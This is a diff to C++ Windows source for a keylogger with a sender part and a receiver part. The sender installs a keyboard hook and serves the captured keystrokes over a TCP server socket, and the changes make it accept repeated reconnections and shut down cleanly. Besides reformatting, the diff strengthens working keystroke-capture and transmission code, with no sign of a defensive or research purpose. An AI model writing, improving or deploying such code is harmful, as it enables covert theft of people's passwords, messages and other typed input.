@@ -29,103 +29,152 @@ KeyloggerSender::~KeyloggerSender()
 
 bool KeyloggerSender::start()
 {
-	if (running)
-	{
-		return true;
-	}
+    if (running)
+    {
+        return true;
+    }
 
-	if (!logger->is_open())
-	{
-		return false;
-	}
+    if (!logger->is_open())
+    {
+        return false;
+    }
 
-	// Initialize server socket first (non-blocking setup)
-	if (!initializeServerSocket())
-	{
-		logger->log("ERROR", "Failed to initialize keylogger server socket");
-		return false;
-	}
+    // Always reinitialize server socket (because stop() closes it)
+    if (!initializeServerSocket())
+    {
+        logger->log("ERROR", "Failed to initialize keylogger server socket");
+        return false;
+    }
 
-	instance = this;
-	running = true;
+    instance = this;
+    running = true;
 
-	// Start threads - accept() will be called in networkServerHandler thread
-	threadManager.startNamedThread("KeystrokeDetection", [this]()
-																 { keystrokeDetectionHandler(); }, ThreadCategory::DATA);
+    // Start threads
+    threadManager.startNamedThread("KeystrokeDetection", [this]()
+                                    { keystrokeDetectionHandler(); }, ThreadCategory::DATA);
 
-	threadManager.startNamedThread("KeyloggerNetworkServer", [this]()
-																 { networkServerHandler(); }, ThreadCategory::NETWORK);
+    threadManager.startNamedThread("KeyloggerNetworkServer", [this]()
+                                    { networkServerHandler(); }, ThreadCategory::NETWORK);
 
-	logger->log("INFO", "KeyloggerSender started on port " + std::to_string(KEYLOGGER_PORT));
-	return true;
-}
-
-void KeyloggerSender::stop()
-{
-	if (!running)
-	{
-		return;
-	}
-
-	running = false;
-	instance = nullptr;
-
-	cleanupKeyboardHook();
-	cleanupSockets();
-
-	threadManager.stopNamedThread("KeystrokeDetection");
-	threadManager.stopNamedThread("KeyloggerNetworkServer");
-
-	if (logger)
-	{
-		logger->log("INFO", "KeyloggerSender stopped");
-	}
+    logger->log("INFO", "KeyloggerSender started on port " + std::to_string(KEYLOGGER_PORT));
+    return true;
 }
 
 void KeyloggerSender::keystrokeDetectionHandler()
 {
-	setupKeyboardHook();
+    setupKeyboardHook();
 
-	MSG msg;
-	while (running && GetMessage(&msg, nullptr, 0, 0))
-	{
-		TranslateMessage(&msg);
-		DispatchMessage(&msg);
-	}
+    MSG msg;
+    // Sử dụng PeekMessage để không block và kiểm tra running flag
+    while (running)
+    {
+        // PeekMessage không block như GetMessage
+        while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE))
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+        
+        // Sleep để không hog CPU
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+    
+    cleanupKeyboardHook();
 }
 
 void KeyloggerSender::networkServerHandler()
 {
-	// Wait for client connection (this is where accept() happens - in background thread)
-	if (!waitForClientConnection())
-	{
-		logger->log("ERROR", "Failed to accept client connection");
-		return;
-	}
+    logger->log("INFO", "KeyloggerNetworkServer thread started");
 
-	logger->log("INFO", "Client connected to keylogger server");
+    // Keep server socket alive for multiple connections
+    while (running)
+    {
+        if (!running) break;
 
-	// Main network loop - keep connection alive and listen for disconnect
-	while (running && keyloggerSocket != INVALID_SOCKET)
-	{
-		char buffer[1];
-		int result = recv(keyloggerSocket, buffer, sizeof(buffer), 0);
-		if (result <= 0)
-		{
-			logger->log("INFO", "KeyloggerReceiver disconnected");
-			break;
-		}
+        // Wait for client connection
+        if (!waitForClientConnection())
+        {
+            logger->log("ERROR", "Failed to accept client connection");
+            if (!running) break;
+            
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+            continue;
+        }
 
-		std::this_thread::sleep_for(std::chrono::milliseconds(THREAD_SLEEP_MS));
-	}
+        logger->log("INFO", "Client connected to keylogger server");
 
-	// Cleanup when connection lost
-	std::lock_guard<std::mutex> lock(connectionMutex);
-	if (keyloggerSocket != INVALID_SOCKET)
-	{
-		closesocket(keyloggerSocket);
-		keyloggerSocket = INVALID_SOCKET;
-	}
+        // Main network loop - keep connection alive
+        while (running && keyloggerSocket != INVALID_SOCKET)
+        {
+            char buffer[1];
+            int result = recv(keyloggerSocket, buffer, sizeof(buffer), 0);
+            if (result <= 0)
+            {
+                logger->log("INFO", "KeyloggerReceiver disconnected");
+                break;
+            }
+
+            std::this_thread::sleep_for(std::chrono::milliseconds(THREAD_SLEEP_MS));
+        }
+
+        // Cleanup client socket when connection lost
+        {
+            std::lock_guard<std::mutex> lock(connectionMutex);
+            if (keyloggerSocket != INVALID_SOCKET)
+            {
+                closesocket(keyloggerSocket);
+                keyloggerSocket = INVALID_SOCKET;
+            }
+        }
+
+        if (running)
+        {
+            logger->log("INFO", "Ready for new connection...");
+        }
+    }
+
+    logger->log("INFO", "KeyloggerNetworkServer thread ending");
+} 
+
+void KeyloggerSender::stop()
+{
+    if (!running)
+    {
+        return;
+    }
+
+    // Signal stop
+    running = false;
+    instance = nullptr;
+
+    // Cleanup keyboard hook (handler will also unhook on exit)
+    cleanupKeyboardHook();
+
+    // Close BOTH sockets to force select()/recv()/accept() to return immediately
+    {
+        std::lock_guard<std::mutex> lock(connectionMutex);
+
+        if (keyloggerSocket != INVALID_SOCKET)
+        {
+            closesocket(keyloggerSocket);
+            keyloggerSocket = INVALID_SOCKET;
+        }
+
+        if (serverSocket != INVALID_SOCKET)
+        {
+            closesocket(serverSocket);
+            serverSocket = INVALID_SOCKET;
+        }
+    }
+
+    // Stop background threads (they should exit because running=false and sockets closed)
+    threadManager.stopNamedThread("KeystrokeDetection");
+    threadManager.stopNamedThread("KeyloggerNetworkServer");
+
+    if (logger)
+    {
+        logger->log("INFO", "KeyloggerSender stopped (all sockets closed)");
+    }
 }
 
 bool KeyloggerSender::initializeServerSocket()
@@ -178,34 +227,69 @@ bool KeyloggerSender::initializeServerSocket()
 
 bool KeyloggerSender::waitForClientConnection()
 {
-	if (serverSocket == INVALID_SOCKET)
-	{
-		logger->log("ERROR", "Server socket not initialized");
-		return false;
-	}
+    if (serverSocket == INVALID_SOCKET)
+    {
+        logger->log("ERROR", "Server socket not initialized");
+        return false;
+    }
 
-	logger->log("INFO", "Waiting for KeyloggerReceiver connection...");
+    logger->log("INFO", "Waiting for KeyloggerReceiver connection...");
 
-	sockaddr_in clientAddr;
-	int clientAddrLen = sizeof(clientAddr);
+    sockaddr_in clientAddr;
+    int clientAddrLen = sizeof(clientAddr);
 
-	// This is where the blocking accept() happens - but now it's in background thread
-	keyloggerSocket = accept(serverSocket, (sockaddr *)&clientAddr, &clientAddrLen);
+    // Loop using select() so we can check `running` periodically and respond to socket close
+    while (running)
+    {
+        fd_set readfds;
+        FD_ZERO(&readfds);
+        FD_SET(serverSocket, &readfds);
 
-	// Close server socket after accepting one connection (like original implementation)
-	closesocket(serverSocket);
-	serverSocket = INVALID_SOCKET;
+        // 500ms timeout
+        timeval tv;
+        tv.tv_sec = 0;
+        tv.tv_usec = 500000;
 
-	if (keyloggerSocket != INVALID_SOCKET)
-	{
-		logger->log("INFO", "KeyloggerReceiver connected successfully");
-		return true;
-	}
-	else
-	{
-		logger->log("ERROR", "Failed to accept client connection");
-		return false;
-	}
+        int sel = select(0, &readfds, nullptr, nullptr, &tv);
+        if (sel == SOCKET_ERROR)
+        {
+            int err = WSAGetLastError();
+            logger->log("ERROR", "select() failed in waitForClientConnection, err=" + std::to_string(err));
+            return false;
+        }
+        else if (sel == 0)
+        {
+            // timeout, loop again to check running flag
+            continue;
+        }
+        else
+        {
+            if (FD_ISSET(serverSocket, &readfds))
+            {
+                SOCKET client = accept(serverSocket, (sockaddr *)&clientAddr, &clientAddrLen);
+                if (client == INVALID_SOCKET)
+                {
+                    int err = WSAGetLastError();
+                    logger->log("WARNING", "accept() returned INVALID_SOCKET, err=" + std::to_string(err));
+                    // if running still true, try again; otherwise exit
+                    if (!running) return false;
+                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
+                    continue;
+                }
+
+                {
+                    std::lock_guard<std::mutex> lock(connectionMutex);
+                    keyloggerSocket = client;
+                }
+
+                logger->log("INFO", "KeyloggerReceiver connected successfully");
+                return true;
+            }
+        }
+    }
+
+    // running == false
+    return false;
 }
 
 void KeyloggerSender::cleanupSockets()
@@ -225,8 +309,6 @@ void KeyloggerSender::cleanupSockets()
 		closesocket(serverSocket);
 		serverSocket = INVALID_SOCKET;
 	}
-
-	WSACleanup();
 }
 
 void KeyloggerSender::setupKeyboardHook()
@@ -422,20 +504,20 @@ bool KeyloggerReceiver::start(const std::string &serverIP)
 
 void KeyloggerReceiver::stop()
 {
-	if (!running)
-	{
-		return;
-	}
+    if (!running)
+    {
+        return;
+    }
 
-	running = false;
-	cleanupSocket();
+    running = false;
+    cleanupSocket();
 
-	threadManager.stopNamedThread("KeystrokeReceiver");
+    threadManager.stopNamedThread("KeystrokeReceiver");
 
-	if (logger)
-	{
-		logger->log("INFO", "KeyloggerReceiver stopped");
-	}
+    if (logger)
+    {
+        logger->log("INFO", "KeyloggerReceiver stopped");
+    }
 }
 
 void KeyloggerReceiver::keystrokeReceiveHandler()
